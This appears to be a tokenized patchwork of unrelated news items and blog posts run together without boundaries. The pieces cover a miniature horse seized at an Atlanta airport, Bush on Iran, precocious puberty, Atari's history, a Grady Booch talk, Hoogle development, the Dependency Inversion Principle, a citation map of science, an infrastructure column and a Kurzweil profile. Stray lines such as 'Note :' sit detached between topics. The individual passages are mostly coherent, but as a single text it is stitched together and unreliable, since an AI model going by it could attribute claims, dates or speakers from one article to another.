You can lead a horse to water , but you can't bring him on an airplane ; unless you cram her into a dog crate .
U.S. Customs and Border Protection officers at Hartsfield - Jackson International Airport intercepted a miniature horse that was in a large dog carrier .
CBP specialists were performing a routine examination of a passenger 's " pet " when they discovered a miniature horse in a large dog carrier .
Officials said the owner of the horse was on his way to Guatemala .
He did not have the proper permits to transport a horse .
The horse was held overnight in a laboratory and the carrier was disinfected .
Agriculture specialists said the horse appeared to be healthy .
USDA veterinary services is issuing a report of violation against the owner and the airline .
Transporting a horse in a kennel is regulated under animal cruelty regulations .

WASHINGTON ( Reuters ) - U.S. President George W. Bush reiterated on Tuesday that all options were on the table in dealing with Iran ’s nuclear challenge .
At the start of a meeting with Israeli Prime Minister Ehud Olmert , Bush was asked if military action remained an option for dealing with Iran .
“ My position has not changed .
All options are on the table .
I would hope that we could solve this diplomatically , ” he replied .
Bush said it was important that Iran faced “ consequences ” such as sanctions and other economic measures for defying the international community over its nuclear program .
“ There ’s a price to be paid , ” Bush said .
The United States accuses Iran of seeking to build atomic bombs , a charge Tehran denies .
Kids grow up fast these days , but many parents are worried it 's too fast when little Sally needs a training bra at age six and Timmy sports a moustache at ten .
The phenomenon is called precocious puberty .
Some doctors think it is happening with greater frequency since the 1990s , especially among girls .
Many factors have been implicated : hormones in food , hormone - mimicking pollutants in the waterways , and even social issues , such as sex in the mass media and single motherhood .
Yet not all scientists are convinced of an actual rise in precocious puberty ; reports have been anecdotal , and studies have been small or inconclusive .
And while all of these possible causes to this possible problem are plausible , doctors say the likely cause , if any , is childhood obesity :
That is , it 's not what 's in the food but food itself , and lots of it , in all it 's fatty - sugary glory , coupled with inactivity .
10 - year - old women
Precocious puberty is as old as puberty itself .
Some kids — for reasons usually genetic but sometimes as a result of a brain tumor or pituitary gland disorder — mature sexually faster than others .
I distinctly remember a boy in my Catholic grade school who seemed to have grown a moustache overnight , at age 10 .
He was quite proud of it until the sisters at the school cold - shaved the sinful thing off .
Precocious puberty is defined as the onset of puberty before age 7 or 8 in girls or age 9 in boys .
There is a range , and this has been part of the problem of establishing the " normal " age of puberty .
Girls might enter full - blown puberty anytime between ages 9 and 15 ; boys between 11 and 17 .
Complicating matters further are racial differences .
On average , African American girls show signs of puberty , with breast development and chemical changes in their bodies , almost two years sooner than white girls , at age 8.8 .
This is according to the largest study on precocious puberty , involving over 17,000 girls , by Marcia Hermann - Giddens of the University of North Carolina , published in 1997 in the journal Pediatrics .
By age 8 , nearly 50 percent of the black girls but only 15 percent of the white girls had begun pubertal development .
Also , historically , the age of first menstruation , called menarche , declined about 0.3 years per decade from the mid-1800s until the 1960s , attributed to better nutrition .
Today the average age of menarche is 12.2 for African Americans and 12.7 for Caucasians .
In the milk ?
Precocious puberty is more serious than the expense of needing to buy razors and tampons .
The early growth spurt can retard fuller growth in adolescence , as the brain tells the bones that growing time is over .
Girls under age 10 are n't mentally prepared for monthly periods .
And earlier sexual desires — with a mature body and immature mind — can lead to earlier sexual encounters .
When precocious puberty entered the radar screen in the early 1990s , the first suspects were hormones in milk and meats , particularly the artificial bovine growth hormone , rBGH .
But this is a protein hormone , destroyed in human digestion , not a steroid hormone like estrogen .
Pollutants are a serious problem .
Plastics and insecticides can break down into chemicals similar to estrogen .
This is thought cause hermaphroditic fish .
Ivelisse Colón of the University of Puerto Rico identified a compelling connection between exposure to chemicals called phthalates and a large increase in breast development among Puerto Rican girls younger than 7 .
Kids too fat
Few scientists are ruling out the impact of pollutants .
But the more logical cause of precocious puberty seems to be childhood obesity .
Here we have a working theory plus numbers to back it up .
Puberty requires the body to have a certain weight and fat distribution , hence the delay for female gymnasts and ballerinas .
So 8 - year - old girls weighing as much as a normal 12 - year - old are at risk for precocious puberty .
But also , across the board , fat children have high levels of the protein leptin .
This chemical , through a complicated chain involving the hypothalamus and pituitary gland , can stimulate the release of the three main hormones in puberty : hypothalamic gonadotropin - releasing hormone , luteinizing hormone and follicle - stimulating hormone .
A study by Kirsten Krahnstoever Davison of Penn State , published in 2003 in Pediatrics , was one of several studies documenting that over 50 percent of overweight girls enter puberty early .
Similarly , studies on young girls adopted from poor countries , suddenly introduced to high - fat diets and entering early puberty , reveal the fat cell connection .
While a cleaner Earth is a fine idea , the best prevention for precocious puberty seems to be to keep kids healthy and running wild like kids .

The Atari 2600 ( originally the Atari VCS ) was the first beauty queen of the home - console video - game set .
It was the first successful cartridge - based console ; had a library of hundreds of games including such classics as Space Invaders , Adventure and Pitfall ; and would spawn a host of successor consoles such as the Atari 5200 and Atari Jaguar .

Atari 's decision to neither financially reward its developers for creating hits nor give them credit for their work , led to the formation of the world 's first third - party game developer .
On October 1 , 1979 , Atari programmers David Crane , Larry Kaplan , Alan Miller and Bob Whitehead , left the company to form Activision .

The world caught Pac - Man fever , and this malady would prove to be a great part of Atari 's downfall in the early 1980s .
Inexplicably , Atari manufactured 12 million copies of Pac - Man when there were only an estimated 10 million consoles sold .
But beyond that , the game was a stinking pile ; Atari skimped on the translation of this arcade classic , and it showed .

The legends are true : Atari did bury many , many copies of E.T. : The Extra-Terrestrial in a New Mexico landfill .
With its poor graphics and frustrating , almost nonsensical , gameplay , E.T. is considered by some to be the worst video game ever made .
It is undoubtedly one of the worst failures in game history , and a leading cause of the video - game crash of 1983 .

“ We are the rain makers . ” September 27 , 2007
Today at the University of Minnesota I got the chance to listen to a speech by Grady Booch .
This was pretty fortuitous , as a couple of our software architects at worked grabbed me at the last minute , showed me where to sign up , and drove me over there .
So I really did n’t know what to expect .
Certainly glad I went and a hell of a lot more fulfilling than the three conference calls I skipped .
I ’m not going to provide a comprehensive summary or recap of topics he covered , but a couple of thoughts :
Much like an opening band at a rock concert that makes the main act look better , I was none too impressed with the Comp Sci professors who introduced Grady .
Is a simple public speaking course not required in academia ?
Does practice make nowhere near perfect ?
Grady on the other hand , was a breath of fresh air .
It ’s been a while since I ’ve seen a speaker so engaging and it ’s really a pleasure to watch someone talented at public speaking .
Grady Booch is a unique talent in that he is spectacular at his chosen profession , he ’s passionate at what he does , and he ’s done it for quite some time .
It ’s really a three - legged stool .
Only the experience of decades in an emerging field and fscking loving what he does got him to where he is today .
It ’s clear he ’s continually challenged himself in his journey , and to put it bluntly “ He gets it . ”
Consequently , due to his depth and breadth of knowledge , he ’s seemed to evolve into an anthropologist or historian .
He rightfully worries about software ( or hardware ) architects fail to follow other crafts : why do n’t we have more access to others ’ solutions ?
How can we develop a sense of beauty or elegance or flexibility or modularity or begin to understand patterns without comparison ?
Of course , no topic on archival can be complete without document / format portability / control .
Speaking of patterns , it ’s clear that his current work style models his interest .
It ’s almost a self - fulfilling prophecy .
Is it surprising for someone versed in patterns and re-usability and abstraction to move iteratively and incrementally ( pun intended ) through multitudes of seemingly parallel consulting projects ?
He must have a massive mental file - o- fax of scenarios , problems spaces , possible solutions and ramifications .
And the more cases he works , the better his results .
God only know how many times he ’s uttered the words “ This reminds of the time I was consulting at the DOD .. ” or “ When we encountered this problem at NASA , we … ” or “ Funny thing , this same shit happened when we reprogrammed the Tube algorithms in London … ” or “ When we had to get rid of the evidence in the Great Guatemalan Debacle of 1986 , we … ”
Patterns , re-usability and abstraction – he uses it on multiple levels .
“ We are the rain makers ” when talking about computer engineers .
Not so far off from Aaron calling us les artistes nouveaux is it ?
“ Between vision and execution the law of entropy holds . ”
What a great comment : he was discussing how a binary “ executable is the Truth but not the whole Truth . ”
What was the intended vision ?
What architectual choices were made and why ?
What sacrifices occurred during the design and implementation ?
( time restraints , etc )
Talking about different types of limits in computing : “ Not everything we want to build can be built ;
Not everything we want to build should be built . ”
Can Do vs. Should Do? Morality and maturity in decision making in a field that has fewer and fewer limitations ?
Has Grady been stealing my material ?
When he opened up the talk to questions , the very first question was on open source / software libre .
To paraphrase : “ Will open source continue to replace proprietary software ? ”
His abridged answer : “ It is an economic inevitability .
Now , is that necessarily a good thing ?
I think yes , yes it is . ”
Not only does freedom allow for innovation , facilitate innovation and foster innovation … the more pervasive software libre becomes and the powerful it becomes as it matures , the more freedom necessitates innovation in proprietary models .
Here ’s his blog .
The very reason that I ’m not writing more of his specific topic is because I encourage everyone to read more of his work , dig into his web site and learn more about his interests today .
When the audience gets to ask questions , I find that many are interested in asking a question that sounds intelligent rather than something that actually vexes them .
So , when I caught Grady after his speech , what did I ask ?
“ Can I get a high - five ? “
Now that ’s the kind of hard - hitting journalism you can expect from me in such a rare opportunity .
I appreciated his visit and loved his enthusiasm , that deserves a high - five does n’t it ?
I mean , if I want to find out his stance on patent law or byte code optimization techniques , I can freaking email him .
Do n’t worry , the follow - up question was a bit better though .
Much like people trying to viewed as smart , people always want to be funny .
People , leave it to the experts like myself , you ’re only going to hurt yourselves .
So I asked “ Like the cliche of yelling Freebird at a show , do people always ask Vi or emacs during the question session ? ”
His look said it all .
“ Oh yeah , especially in the Valley .
And depending on the amount of facial hair , you already know which they prefer . ”
Go see him if you can .
Does he have a worldwide tour schedule ?
Did I get a concert tee - shirt ?
( third concert reference for those keeping track at home )
In the Spaghetti Westerns of Computer Science , he’d be wearing a White Hat – he seems to be one of the Good Guys .
Thanks to Mark and Aaron for the invitation and transportation .
Note :
I have n't done much on Hoogle 4 in quite a while , and since I keep telling people that various bugs will be " fixed in Hoogle 4 " , it seems only polite to fix those bugs in the near future .
I decided that this evening I would focus on Hoogle 4 , since I was slowly going insane from writing academic papers .
I 'm now just about to go to bed , so thought I would summarise what I did .
One of the things that has been slowing me down on Hoogle is the fact that I rarely get a chance to work on it , and when I do that means I have to refamiliarise myself with the code base .
Each time I do this , I forget something , forget what I was working for , and generally end up slowing down development .
It also means that working on Hoogle for " an odd half hour " is not practical , it takes at least a couple of hours to get up to speed .
In order to solve this , I 've done some diagrams of the module structure , and the main Hoogle database .
They may not mean much to anyone else , but I hope they are enough to keep my mind fresh with where things go .
As part of documenting the module structure , it also gives a chance to reflect on where the module structure is a bit unclear , and modify as necessary .
Previously the module structure had DataBase and Item each being dependent on each other - with tricks like having an extra field in Item which was of a parametrised type , i.e:data Item a = Item {name :: String , typeSig :: TypeSig , other :: a}Fortunately now all that is gone , and the structure is a lot more logical .
The other thing I 've been doing is moving to the Deferred Binary library .
Part of the reason for Hoogle 4 becoming bogged down is the creation of a central database that is loaded on demand , and contains tries etc to perform efficient searches .
Unfortunately , this loading on demand aspect had infected the entire code , resulting in a big IO Monad mess .
It was slightly more pleasant than coding in C , but all the low - level thoughts had seeped through , requiring careful though , slow progress and frequent mistakes .
To take one example , the Hoogle .
DataBase .
Texts module , which is responsible for performing all textual searches and storing the lazily - loaded trie .
Compare the old version and the current version .
The code has shrunk from 186 lines to 65 - of which only about 30 are real code .
The IO Monad is nowhere to be seen - everything is pure .
The really low - level functions such as sizeTree and layoutTree have gone entirely .
I 'm not sure when I will next be able to get to Hoogle 4 , but next time I hope to start working on it faster , and that the cleaner code makes for happier coding !
I have started displaying adverts on this blog because it was only a button click away ( very impressive integration by Google ) , it seemed like a fun thing to try and that the adverts in Gmail are sometimes quite helpful .
I have deliberately picked to not show too many adverts , placed them off to the side where they wo n't interfere with reading and tried to keep it minimal - but if they are annoying please let me know .
I am going to donate whatever money ( if any ) from this to charity - but please do n't take that as an incentive to artificially click on adverts you are n't interested in .
It is easier to make a low - level module reusable , than a high level module .
Firstly , a low - level module generally has clearer goals ( do one thing and do it right ) , and wider usability ( number of people who need a generic stack is much more than those who need a document indexer ) .
Secondly , a low - level module has less dependencies on other modules .
When one moves a module from one application to another , one also needs to move all the modules that it depends on and , since dependency is transitive , also the modules that those modules depend on and so on .
So , higher the efferent coupling of a module , harder it is to reuse it .
Note that we are talking about reusing a module and not just copying chunks of code .
Code copying is not code reuse .
code copying … comes with a serious disadvantage : you own the code you copy !
If it does n’t work in your environment , you have to change it .
If there are bugs in the code , you have to fix them .
If the original author finds some bugs in the code and fixes them , you have to find this out , and you have to figure out how to make the changes in your own copy .
Eventually the code you copied diverges so much from the original that it can hardly be recognized .
The code is yours .
While code copying can make it easier to do some initial development ; it does not help very much with the most expensive phase of the software lifecycle , maintenance .
I prefer to define reuse as follows .
I reuse code if , and only if , I never need to look at the source code ( other than the public portions of header files ) .
I need only link with static libraries or include dynamic libraries .
Whenever these libraries are fixed or enhanced , I receive a new version which I can then integrate into my system when opportunity allows .
Now , to make my high level component reusable , I need to remove it ’s dependencies on low - level modules .
This is one of the motivations behind Dependency Inversion Principle put forward by Robert C. Martin in another of his brilliant papers on Design Patterns .
Consider the implications of high level modules that depend upon low level modules .
It is the high level modules that contain the important policy decisions and business models of an application .
It is these models that contain the identity of the application .
Yet , when these modules depend upon the lower level modules , then changes to the lower level modules can have direct effects upon them ; and can force them to change .
This predicament is absurd !
It is the high level modules that ought to be forcing the low level modules to change .
It is the high level modules that should take precedence over the lower level modules .
High level modules simply should not depend upon low level modules in any way .
Moreover , it is high level modules that we want to be able to reuse .
We are already quite good at reusing low level modules in the form of subroutine libraries .
When high level modules depend upon low level modules , it becomes very difficult to reuse those high level modules in different contexts .
However , when the high level modules are independent of the low level modules , then the high level modules can be reused quite simply .
He defines the Dependency Inversion Principle as
a) High level modules should not depend upon low level modules .
Both should depend upon abstractions .
b)
Abstractions should not depend upon details .
Details should depend upon abstractions .
Here ’s an example from the same paper .
In the traditional layered design as below , a change in the lowest level Utility Layer can affect the highest level Policy Layer .
Instead of letting each layer depend directly on the one underneath it , I can make each of the higher level layers use the lower layer through an interface ( abstract class ) that the actual layer implements ( derives from ) .
Now none of the higher level layers will be affected if any of the lower level layers change , as long as they keep abiding to their respective interfaces .
If I switch to a third party library for any of the lower level layers , I can write an Adapter to make it confirm to its interface , thereby not affecting the higher level layer at all .
In many simple cases , DI can also be achieved through callbacks .
A very common example is when a module provides APIs to allow the application to set its own memory allocation and de-allocation callbacks .
The application may do this when it wants to use a heap optimized for small memory allocations , or if it wants to keep track of total memory allocated .
However , I think there are cases when it ’s alright if you do n’t follow DIP .
Lower - level module is highly stable .
If you know that the lower - level module wo n’t change much during the life time of the depending module , and you are never going to have to replace it , even when the depending module is reused in another application , there is no harm in depending directly on it .
Lower - level module is highly specific .
Again , if you ’ll never have to replace the lower - level module with another , you can depend directly on it .
Performance is crucial .
Use of abstract classes and virtual functions has a performance penalty .
So it ’s not advisable for the performance critical parts of the application .
However , one can consider using plain function callbacks to achieve DI in such cases , as in the allocation / de- allocation routine example above .
To show how information builds up and flows among scientific disciplines , Columbia University computer scientist W. Bradford Paley , along with colleagues Kevin Boyack and Dick Klavans , categorized about 800,000 scholarly papers into 776 areas of scientific study ( shown as colored circular nodes ) based on how often the papers were cited together by other papers .
Paley then grouped those nodes by color under 23 broader areas of scientific inquiry , from mental health to fluid mechanics .
See the map here .
1 Social Scientists Do n’t Do Chemistry
The bigger a node is , the more papers it contains .
Heavily cited papers appear in more than one node .
Black lines connect any nodes that contain the same papers ; the darker a link is , the more papers the connected nodes have in common .
These links create the structure of the map and tend to pull similar scientific disciplines closer to one another .
2 Birds of a Feather
Paley refers to his map as a “ feather boa ” — the feathers being gently waving strings of key words that uniquely define each node ’s particular subject matter .
In tiny type , the word string “ percutaneous tracheostomy , material review , autoimmune pancreatitis , and dialysis catheter , ” for example , swirls off a node in the infectious disease area .
Unlike the carefully calculated placement of the nodes , the team ’s arrangement of the word strings on the page was left mostly to aesthetics .
3 The Road to Knowledge
The map does n’t show the road to breakthrough discoveries , but it can be used to determine which areas of science are most closely connected to one another , as well as which are the most — and least — intellectually vital and productive .
Advances in mathematics are few .
Medicine , on the other hand , dominates the lower half of the map .
4 No Science Is an Island
… except maybe organic chemistry .
One might assume that this bane of premed students is closely tied to medicine , but the map shows that the route from organic chemistry to health care requires more than one pit stop through fields like analytical chemistry , physical chemistry , biology , and even earth sciences .
In fact , all of chemistry is a bit of an inside job .
The links between the nodes of different chemistry disciplines are darker than other links because the disciplines tend to contain the same papers .
5 The Friendster Element
On the map , computer science is linked more closely to social sciences like psychology and sociology than to applied physics .
“ If you trust it for a minute , it does make intuitive sense , ” Paley says .
Social networks like Friendster depend heavily on software programs , while social scientists frequently rely on computers for statistical analysis .
I write about animation claymation and cartoons that i find interesting and different .
( Fortune ) --
It was the breaking - news headline last Friday that three construction workers had died in a coal - mine accident in Princeton , Ind. , and maybe the markets melting down too , that congealed in my mind a thought I 'd been kicking around for a while now :
Our country is having an " Atlas Shrugged " moment .
Trapped coal miners in Utah , smashed levees in New Orleans , busted steam pipes and flooded subways in New York City , a collapsed bridge over the Mississippi River in Minnesota , an air - traffic - control system stressed to its break point .
Could this really be a description of the most prosperous country on the planet ?
Can these all be coincidences ?
Is it time for a good old - fashioned conspiracy theory , the type that a reflection on Ayn Rand , Alan Greenspan 's early mentor , might inform ?
For sensible adults who have n't thought about Rand and her darkly fabulist novel in years , the thing to remember about " Atlas Shrugged " - other than the cloying mystery , Who is John Galt ?
- is that the country was disintegrating in front of the eyes of our various capitalist heroes .
The rail lines in particular were in peril in this 1957 book , a turgid ode to selfishness nonetheless considered a masterpiece by Rand 's followers , who call themselves Objectivists .
In " Atlas Shrugged , " society was falling apart because the elites - read : socialists - were n't allowing the markets to function .
A drumbeat of deadly railroad accidents punctuated and emphasized the calamity .
Cut to the present .
Barely a day goes by that some disaster or another does n't strike , usually having nothing to do with any natural act .
The Indiana accident turned out to be just that , construction workers who fell which , tragically , happens from time to time , in good times and bad .
But the levees ?
After much consideration the U.S. Army Corps of Engineers has now fessed up to its responsibility for poor construction and maintenance over decades .
When I was in New Orleans in July I heard a story about a levee that did n't fail .
It is operated by Lockheed - Martin ( Charts , Fortune 500 ) at a plant that makes fuel tanks for the Space Shuttle .
Workers braved Hurricane Katrina and operated pumps during the storm .
The privately operated - but government financed - levees held .
I happened to be in New York last week the day the subways flooded .
According to New York Gov. Eliot Spitzer , it 's the third time this has happened in seven months .
The New York subway has been pumping water out of its tunnels for a century .
Why are downpours disabling New York City now ?
Likewise the bridge collapse in Minnesota .
Accidents happen , but it 's inconceivable that such a major thoroughfare in a major city would n't be thoroughly and regularly stress tested .
What 's causing all this ?
Could it be the reverse of the " Atlas Shrugged " effect ?
Might it be that greedy capitalists , comfy in their private jets and third , fourth and fifth vacation homes , are n't paying attention to the national infrastructure that they do n't think they need to use ?
As for the political leadership , infrastructure spending is one of those rare instances where President Bush 's take is spot - on correct , though his words likely wo n't be heeded because he is so unpopular and divisive .
( The immigration debate , where the president has been pragmatic and right from the beginning , also comes to mind . )
Asked if gasoline taxes should be raised to pay for infrastructure improvements , the president chastised Congress for favoring attention - getting new projects over boring maintenance needs .
He 's right .
Liberals like Chuck Schumer agree .
" Routine but important things like maintenance always get shortchanged because it 's nice for somebody to cut a ribbon for a new structure , " Schumer recently told the New York Times .
Today 's Randians , of course , have an answer to our woes : Privatize everything .
No way a bridge falls if a profit - seeking company , properly incentivized , had been charged with maintaining it , goes the argument .
That , however , is dangerous thinking .
There are certain things the market just can't be trusted to handle .
Imagine that bridge - maintenance company having to cut expenses this quarter by delaying work for just a few days .
Imagine how the CEO might feel if the stock would drop if he could n't make the quarter .
The markets do n't always work for the public good .
Just ask CEOs of mortgage lenders that pushed no-documentation loans , which anyone with common sense knew was just asking for trouble .
The solution is n't to abolish government .
It 's to make government work better .
We 'll get through this .
We always do .
As a country we 'll become outraged at our crumbling infrastructure and demand that our leaders fix it .
By punishing their stock prices - what they really care about - lenders and home builders who duped people into spending beyond their means will get their comeuppance .
And then the stocks markets and the economy will be just fine .
Plutocrats will realize that their limos travel over bridges and that their employees take the subway .
Who is John Galt , anyway ?
( Fortune Magazine ) --
If you went around saying that in a couple of decades we 'll have cell - sized , brain - enhancing robots circulating through our bloodstream or that we 'll be able to upload a person 's consciousness into a computer , people would probably question your sanity .
But if you say things like that and you 're Ray Kurzweil , you get invited to dinner at Bill Gates ' house - twice - so he can pick your brain for insights on the future of technology .
The Microsoft chairman calls him a " visionary thinker and futurist . "
Kurzweil is an inventor whose work in artificial intelligence has dazzled technological sophisticates for four decades .
He invented the flatbed scanner , the first true electric piano , and large - vocabulary speech - recognition software ; he 's launched ten companies and sold five , and has written five books ; he has a BS in computer science from MIT and 13 honorary doctorates ( but no real one ) ; he 's been inducted into the Inventor 's Hall of Fame and charges $ 25,000 every time he gives a speech - 40 times last year .
And now , if anything , he 's gaining momentum as a cultural force :
He has not one but two movies in the works - one a documentary about his career and ideas and the other an adaptation of his recent bestseller , The Singularity Is Near , which he 's writing and co-producing ( he 's talking about a distribution deal with the people who brought you " The Day After Tomorrow " ) .
When Kurzweil is n't giving keynote addresses or reading obscure peer - review journals , he 's raising money for his new hedge fund , FatKat ( Financial Accelerating Transactions from Kurzweil Adaptive Technologies ) .
He 's already attracted a roster of blue - ribbon investors that includes venture capitalist Vinod Khosla , former Microsoft CFO Mike Brown , and former Flextronics - CEO - turned - KKR - partner Michael Marks .
Being a hedge fund manager may seem an odd pursuit for an expert in AI , but to Kurzweil it 's perfectly natural .
The magic that has enabled all his innovations has been the science of pattern recognition - and what is the financial market , he postulates , but a series of patterns ?
Kurzweil , however , has something bigger on his mind than just making money - after half a lifetime studying trends in technological change , he believes he 's found a pattern that allows him to see into the future with a high degree of accuracy .
The secret is something he calls the Law of Accelerating Returns , and the basic idea is that the power of technology is expanding at an exponential rate .
Mankind is on the cusp of a radically accelerating era of change unlike anything we have ever seen , he says , and almost more extreme than we can imagine .
What does that mean ?
By the time a child born today graduates from college , Kurzweil believes , poverty , disease , and reliance on fossil fuels should be a thing of the past .
Speaking of which , do n't get him started on global - warming hype .
" These slides that Gore puts up are ludicrous , " says the man who once delivered a tech conference presentation as a singing computer avatar named Ramona .
( That stunt was the inspiration for the 2002 Al Pacino movie " Simone . " )
" They do n't account for anything like the technological progress we 're going to experience . "
He has plenty more ideas that may seem Woody Allen - wacky in a " Sleeper " kind of way ( virtual sex as good as or better than the real thing ) and occasionally downright disturbing � la " 2001 : A Space Odyssey " ( computers will achieve consciousness in about 20 years ) .
But a number of his predictions have had a funny way of coming true .
Back in the 1980s he predicted that a computer would beat the world chess champion in 1998 ( it happened in 1997 ) and that some kind of worldwide computer network would arise and facilitate communication and entertainment ( still happening ) .
His current vision goes way , way past the web , of course .
But at least give the guy a hearing .
" We are the species that goes beyond our potential , " he says .
" Merging with our technology is the next stage in our evolution . "
In mid-April , Kurzweil traveled to the Island hotel in Newport Beach , Calif. , as one of the featured speakers at a two - day World Innovation Forum .
The roster of luminaries included Harvard Business School professor Clayton Christensen and Vint Cerf , one of the fathers of the Internet , now at Google ( Charts , Fortune 500 ) .
But Kurzweil was the only one followed around by a team of documentary - film makers .
He took the stage wearing a brown houndstooth sports coat and navy checked tie and began toggling through his PowerPoint slides .
He 's about 5 - foot - 7 , and in regular conversation he tends to speak in a monotone .
But he comes alive onstage , mixing in reliable one - liners with his bigger point :
Do n't underestimate the power of technological change .
" Information technologies are doubling in power every year right now , " he tells the crowd of 400 or so attendees .
" Doubling every year is multiplying by 1,000 in ten years .
It 's remarkable how scientists miss this basic trend . "
Kurzweil 's crusade , if you will , is to get across that most of us ( even scientists ) fail to see the world changing exponentially because we are " stuck in the intuitive linear view . "
To hammer home his point , Kurzweil packs his presentations with charts that show , for instance , supercomputer power doubling consistently over time .
He explains that Moore 's Law - the number of transistors on a chip will double every two years - is but one excellent example of the Law of Accelerating Returns .
One of Kurzweil 's favorite illustrations of exponential growth is the Human Genome Project .
" It was scheduled to be a 15 - year project , " he says .
" After seven years only 1 % of it was done , and the critics said it would be impossible .
But if you double from 1 % every year over seven years , you get 100 % .
It was right on schedule . "
He believes humanity is near that 1 % moment in technological growth .
By 2027 , he predicts , computers will surpass humans in intelligence ; by 2045 or so , we will reach the Singularity , a moment when technology is advancing so rapidly that " strictly biological " humans will be unable to comprehend it .
Everything will be subject to his Law of Accelerating Returns , Kurzweil says , because " everything is ultimately becoming information technology . "
As we are able to reverse - engineer and decode our own DNA , for instance , medical technology can be converted to bits and bytes and zoom along at the same fantastic rate .
That will enable overlapping revolutions in genetics , nanotechnology , and robotics .
Which is how you end up with nanobots living in your brain .
Kurzweil , 59 , declared his career as an inventor at age 5 .
He grew up in Queens , New York , one of two children ( he has a younger sister named Enid ) of Fredric and Hannah Kurzweil , Viennese Jews who fled the Nazis in 1938 .
His parents encouraged their son's ambition .
" Ideas were the religion of our household , " he says .
" They saw science and technology as the way of the future and a way to make money and not struggle the way they did . "
Fredric , a composer and conductor , died of heart disease at 58 , an event that would have a lasting impact on his son .
Kurzweil discovered computers at age 12 , and quickly demonstrated an amazing facility with technology .
At 14 he wangled a job as the computer programmer at the research department of Head Start , the federal government 's early - childhood - development program .
While there he wrote software that was later distributed by IBM ( Charts , Fortune 500 ) with its mainframes .
At 17 he won an international science contest by building a computer that analyzed the works of Chopin and Beethoven to compose music ; that trick landed him on the TV show " I 've Got a Secret , " hosted by Steve Allen .
At MIT he started a company that used a computer to crunch numbers and match high school students with the best college choice ; he sold it for $ 100,000 plus royalties .
After graduating from MIT , he founded Kurzweil Computer Products in 1974 , and his initial breakthrough came later that year when he created the first optical - character - recognition program capable of reading any font .
After he happened to sit next to a blind man on a plane , he decided to apply the technology to building a reading machine for the sight - impaired .
To make it work he invented the flatbed scanner and the text - to - speech synthesizer , and introduced a reader in 1976 .
When his first reader customer - Stevie Wonder - later complained about the limitations of electronic keyboards , Kurzweil used pattern - recognition science to invent the first keyboard that could realistically reproduce the sound of pianos and other orchestra instruments .
Thus was born Kurzweil Music Systems .
( When his name is recognized today , it 's still often as " that keyboard guy . " )
Kurzweil never left the Boston area after college .
He and his wife , Sonya , live in a suburb about 20 minutes west of the city in a house they bought 25 years ago .
Both of his children are grown and out of the house - Ethan , 28 , is at Harvard Business School and Amy , 20 , is at Stanford - so it 's just the two of them and 300 or so cat figurines .
( Kurzweil says he likes the way cats always seem to be " calmly thinking through their options . " )
Kurzweil wo n't say how much he 's worth , but he 's never had the kind of payday that made so many of his peers centimillionaires or better .
He sold Kurzweil Computer Products to Xerox ( Charts , Fortune 500 ) in 1980 for $ 6.25 million .
Kurzweil Music Systems was in bankruptcy when Korean piano maker Young Chang bought it in 1990 for $ 12 million .
Kurzweil Applied Intelligence introduced a series of speech - recognition products and went public in 1993 , but was tarnished by an accounting - fraud scandal in 1995 .
Kurzweil , who was co-CEO , was not implicated .
" I was focusing on the technology , " he says .
" There was this small conspiracy , which was deeply shocking . "
KAI was sold in 1997 for $ 53 million .
If Kurzweil has n't made the big score , he 's done well enough to keep funding his new ventures .
Former Microsoft ( Charts , Fortune 500 ) CFO Brown has invested in a few of Kurzweil 's businesses and says he 's impressed .
" There 's a certain smart kind of person who can get all the way from the big picture down to the little kernel and back , " he says .
" He 's extremely adaptive that way .
His businesses in my experience have always been well run and successful .
He 's grown them until they get to be a certain size and typically sold them to somebody who has a bigger distribution network . "
These days Kurzweil organizes his business interests - including FatKat and Ray & Terry 's Longevity Products , which sells supplements - under the umbrella of Kurzweil Technologies .
The company takes up all of one floor and half of another in a nondescript office - park building in Wellesley Hills , Mass .
In the reception area on the second floor is an antique Ediphone , one of Thomas Edison 's dictation machines .
On a table filled with plaques noting Kurzweil 's achievements is a photo of him receiving the National Medal of Technology from President Clinton .
There 's a pipe - smoking mannequin with a ribbon that reads I AM AN INVENTOR on its chest .
In the basement is a supercomputer processing millions of bits of market - related data .
Kurzweil is hoping that FatKat will prove to be as spectacular an achievement as his early inventions , only a lot more lucrative .
When describing his approach , he refers to the success of fellow MIT board member and hedge fund manager James Simons of Renaissance Technologies , whose $ 6 billion fund Medallion has averaged 36 % returns annually after fees since 1988 and who , according to the hedge fund trade magazine Alpha , was the highest - paid hedgie last year , with a take - home of $ 1.7 billion .
Kurzweil says he is applying Simons - like quantitative analysis to take advantage of market inefficiencies .
And he 's confident that , just as he trained computers to recognize patterns in human speech or the sound of a violin , he can do the same with currency fluctuations and stock - ownership trends .
The ultimate goal is to create the first fully artificially intelligent quant fund - a black box that can learn to monitor itself and adjust .
Although he started the company back in 1999 , the fund has only been trading for about a year .
How 's he doing ?
Kurzweil wo n't say , citing SEC rules , nor will his investors .
" I view Ray as one of the best pattern - recognition people in the world , " says Khosla , when asked why he put money into FatKat .
" I am a happy investor in Ray 's company .
A very happy investor . "
As respected as Kurzweil is , to some of his peers his ideas have a persistent whiff of the too - good - to - be - true .
One intellectual equal who takes exception to Kurzweil 's views is Mitch Kapor , the co-founder and former CEO of Lotus Development .
In 2002 , Kapor made a much publicized $ 20,000 bet with Kurzweil that a computer would not be able to demonstrate consciousness at a human level by 2029 .
But his quibbles with Kurzweil run much deeper than that debate .
He rejects Kurzweil 's theories about the implications of accelerating technology as pseudo - evangelistic bunk .
" It 's intelligent design for the IQ 140 people , " he says .
" This proposition that we 're heading to this point at which everything is going to be just unimaginably different - it 's fundamentally , in my view , driven by a religious impulse .
And all of the frantic arm - waving can't obscure that fact for me , no matter what numbers he marshals in favor of it .
He 's very good at having a lot of curves that point up to the right . "
Even technologists who take Kurzweil seriously do n't necessarily echo his optimism .
It was after a conversation with him that Bill Joy wrote an apocalyptic cover story for Wired magazine in 2000 about nanotechnology run amok .
Kurzweil , who 's always careful to acknowledge the possibility that everything could go haywire , says his outlook is about math , not religion .
And he's not planning to go anywhere until he bears witness to humankind 's ultimate destiny , even if it takes him forever .
Note that by " forever " we mean " forever " :
The man literally intends not to die .
With an acute memory of his father 's early death , he 's been getting weekly blood tests and intravenous treatments .
He also takes pills - lots of pills , more than 200 vitamins , antioxidants , and other supplements every day .
It 's all part of his effort to " reprogram " his body chemistry and stop growing old .
" I 've slowed down aging to a crawl , " he claims .
" By most measures my biological age is about 40 , and I have some hormone and nutrient levels of a person in his 30s . "
Tuesday night in Newport Beach , after his talk at the Innovation Forum , Kurzweil is having dinner at an upscale seafood restaurant with one of his true believers , Peter Diamandis .
